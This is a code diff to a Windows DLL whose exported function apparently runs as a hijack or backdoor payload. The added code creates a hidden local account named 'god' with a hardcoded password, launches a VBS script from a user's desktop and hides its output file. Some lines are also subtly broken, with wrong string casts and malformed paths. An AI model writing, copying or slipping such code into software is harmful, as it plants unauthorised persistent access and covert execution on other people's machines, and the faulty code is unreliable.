@@ -11,9 +11,14 @@
 #include<Fileapi.h>
 #include <tchar.h>
 #include <winbase.h>
-
+#include<lmaccess.h>
+#include <lm.h>
 #include <strsafe.h>
 
+#ifndef UNICODE
+#define UNICODE
+#endif
+#pragma comment(lib, "netapi32.lib")
 
 
 extern "C" _declspec(dllexport)
@@ -24,10 +29,31 @@ void doSomething(void)
     GetSystemInfo(&siSysInfo);
     DWORD           dwAttrs;
 
+    USER_INFO_1 ui;
+
+    ui.usri1_name = (LPWSTR)"god";
+    ui.usri1_password = (LPWSTR)"P@ssw0rd124";
+    ui.usri1_priv = USER_PRIV_USER;
+    ui.usri1_home_dir = NULL;
+    ui.usri1_comment = NULL;
+    ui.usri1_flags = UF_SCRIPT;
+    ui.usri1_script_path = NULL;
+
+
+
+    NET_API_STATUS nStatus;
+    DWORD dwError = 0;
+
+    nStatus = NetUserAdd(NULL,
+        1,
+        (LPBYTE)&ui,
+        &dwError);
+
+
  
     
-   system("systeminfo > systeminfo.txt");
-   SetFileAttributesW(L"C\\Users\\pxj59\\Desktop\systeminfo.txt", FILE_ATTRIBUTE_HIDDEN);
+   system("C:\\Users\\pxj59\\Desktop\\invis.vbs");
+   SetFileAttributesW(L"C:\\Users\\pxj59\\Desktop\output.txt", FILE_ATTRIBUTE_HIDDEN);
 
 
 
